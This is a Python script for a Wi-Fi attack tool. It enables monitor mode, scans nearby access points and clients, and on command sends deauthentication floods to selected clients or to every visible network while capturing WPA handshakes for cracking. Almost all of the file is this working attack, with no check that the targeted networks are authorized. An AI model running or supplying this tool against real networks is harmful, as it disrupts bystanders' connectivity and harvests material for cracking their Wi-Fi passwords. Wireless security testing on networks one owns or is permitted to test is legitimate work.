#!/usr/bin/env python3
import os, re, subprocess, time, threading, csv
from datetime import datetime
from colorama import Fore, Style, init
from resources.mac_vendors import MAC_VENDOR_PREFIXES
import sys, termios, tty, select

init(autoreset=True)

LOG_FILE = "wifi_ap.log"
HANDSHAKE_DIR = "handshakes"
REFRESH = 6
MON_IF = None
SKIP_APS = set()

os.makedirs(HANDSHAKE_DIR, exist_ok=True)

def run_cmd(cmd, sudo=False):
    if sudo and os.geteuid() != 0:
        cmd = ['sudo'] + cmd
    return subprocess.check_output(cmd, encoding='utf-8', errors='ignore')

def select_interface():
    out = run_cmd(['iw', 'dev'])
    matches = re.findall(r'Interface\s+(\w+)', out)
    usable = [iface for iface in matches if 'wl' in iface]
    if not usable:
        print(Fore.RED + "[!] No usable wireless interfaces found.")
        exit(1)
    for i, name in enumerate(usable, 1):
        print(f"  [{i}] {name}")
    return usable[int(input("Choose interface: ")) - 1]

def enable_monitor():
    global MON_IF
    iface = select_interface()
    try:
        run_cmd(['airmon-ng', 'start', iface], sudo=True)
        out = run_cmd(['iw', 'dev'])
        mon_ifaces = [i for i in re.findall(r'Interface\s+(\w+)', out)
                      if 'type monitor' in run_cmd(['iw', 'dev', i, 'info'])]
        MON_IF = mon_ifaces[0] if mon_ifaces else iface
        print(Fore.GREEN + f"[*] Using monitor interface: {MON_IF}")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"[!] Failed to enable monitor mode on {iface}\n    ↳ Error: {e}")
        exit(1)

def disable_monitor():
    if MON_IF:
        run_cmd(['airmon-ng', 'stop', MON_IF], sudo=True)

def start_airodump():
    return subprocess.Popen(['sudo','airodump-ng','--ignore-negative-one','--write-interval','1',
                             '--write','/tmp/apdump','--output-format','csv', MON_IF],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def parse_csv():
    try:
        lines = open('/tmp/apdump-01.csv', errors='ignore').read().splitlines()
    except:
        return {}

    aps, clients, section = {}, [], 0
    for line in lines:
        if not line.strip(): continue
        if 'BSSID' in line and 'Privacy' in line: section = 1; continue
        elif 'Station MAC' in line: section = 2; continue

        parts = [x.strip() for x in line.split(',')]
        if section == 1 and len(parts) >= 14:
            bssid = parts[0]
            try:
                aps[bssid] = {
                    'ssid': parts[13].strip(),
                    'ch': int(parts[3]),
                    'sig': int(parts[8]),
                    'clients': [],
                    'handshake': False
                }
            except ValueError:
                continue
        elif section == 2 and len(parts) >= 6:
            clients.append({'mac': parts[0], 'ap': parts[5]})

    for c in clients:
        if c['ap'] in aps:
            aps[c['ap']]['clients'].append(c['mac'])

    return aps

def vendor(mac):
    return MAC_VENDOR_PREFIXES.get(mac.lower().replace('-',':')[:8], "Unknown")

def log_event(evt, bssid='', ssid='', mac='', vendor_name='', sig=0):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, 'a+', encoding='utf-8') as f:
        f.write(f"{ts};{evt};{bssid};{ssid};{mac};{vendor_name};{sig}\n")

def deauth_and_capture(bssid, ssid, target_mac, channel):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = re.sub(r'\W+', '_', ssid or bssid)
    base = os.path.join(HANDSHAKE_DIR, f"{safe}_{timestamp}")
    cap = base + "-01.cap"
    print(Fore.YELLOW + f"[*] Deauthing {ssid} ({bssid}) on channel {channel}")
    run = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', base, MON_IF],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    subprocess.Popen(['aireplay-ng','--deauth','10','-a',bssid, *(['-c',target_mac] if target_mac else []), MON_IF])
    time.sleep(10)
    run.terminate()
    print(Fore.CYAN + f"[*] verifying {cap} ...", end=' ')
    res = subprocess.run(['aircrack-ng','-a2','-w','/dev/null',cap], stdout=subprocess.PIPE, text=True)
    ok = 'handshake' in res.stdout.lower()
    print((Fore.GREEN + "[OK]") if ok else (Fore.RED + "[NO]"))
    log_event('HANDSHAKE_' + ('SUCCESS' if ok else 'FAIL'), bssid, ssid, target_mac, vendor(target_mac), 0)
    return ok

def display(aps):
    os.system('clear')
    print(Fore.CYAN + f"[ WIFI MONITOR {datetime.now().strftime('%H:%M:%S')} ]" + Style.RESET_ALL)
    print(f"{'SSID':<22} {'BSSID':<20} {'SIG':>5} {'CH':>3} {'#CL':>4} {'HS':>4}")
    print('-' * 70)

    for bssid, info in sorted(aps.items(), key=lambda x: x[1]['sig'], reverse=True):
        if bssid in SKIP_APS: continue
        ssid = info['ssid'][:22].ljust(22)
        sig_val = info['sig']
        signal = (Fore.GREEN if sig_val >= 60 else Fore.YELLOW if sig_val >= 40 else Fore.RED) + f"{sig_val}".rjust(5) + Style.RESET_ALL
        ch = str(info['ch']).rjust(3)
        num_clients = str(len(info['clients'])).rjust(4)
        hs_flag = Fore.GREEN + '[OK]' if info.get('handshake') else Fore.RED + '[--]'
        print(f"{ssid} {bssid:<20} {signal} {ch} {num_clients}  {hs_flag}")

        for mac in info['clients']:
            print(Fore.LIGHTBLACK_EX + f"    ↳ {mac:<17} ({vendor(mac)})" + Style.RESET_ALL)

    print("\n" + Fore.YELLOW + "[h] selected clients  [H] all APs  [s] skip AP  [q] quit" + Style.RESET_ALL)

def getch(timeout=0.1):
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setcbreak(fd)
        if select.select([fd], [], [], timeout)[0]:
            return sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return None

def input_listener(state):
    while state['running']:
        k = getch()
        if not k: continue
        if k == 'q': state['running'] = False
        elif k == 'h': state['do_h'] = True
        elif k == 'H': state['do_H'] = True
        elif k == 's': state['skip_next'] = True

def handle_deauth(aps, state, all_aps=False):
    for bssid, info in aps.items():
        if bssid in SKIP_APS: continue
        if all_aps or state['do_h']:
            targets = info['clients'] if not all_aps else ['']
            for mac in targets:
                if deauth_and_capture(bssid, info['ssid'], mac, info['ch']):
                    aps[bssid]['handshake'] = True

    state['do_h'] = state['do_H'] = False

def skip_first_ap(aps):
    if aps:
        skip_bssid = next(iter(aps))
        SKIP_APS.add(skip_bssid)
        print(Fore.MAGENTA + f"[!] Skipping {skip_bssid}")

def main():
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE,'w').write("ts;evt;bssid;ssid;mac;vendor;signal\n")
    enable_monitor()
    time.sleep(3)
    proc = start_airodump()
    state = {'running': True, 'do_h': False, 'do_H': False, 'skip_next': False}

    threading.Thread(target=input_listener, args=(state,), daemon=True).start()

    try:
        while state['running']:
            aps = parse_csv()
            display(aps)

            if state['do_h'] or state['do_H']:
                handle_deauth(aps, state, all_aps=state['do_H'])

            if state['skip_next']:
                skip_first_ap(aps)
                state['skip_next'] = False

            time.sleep(REFRESH)

    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        disable_monitor()

if __name__ == "__main__":
    main()
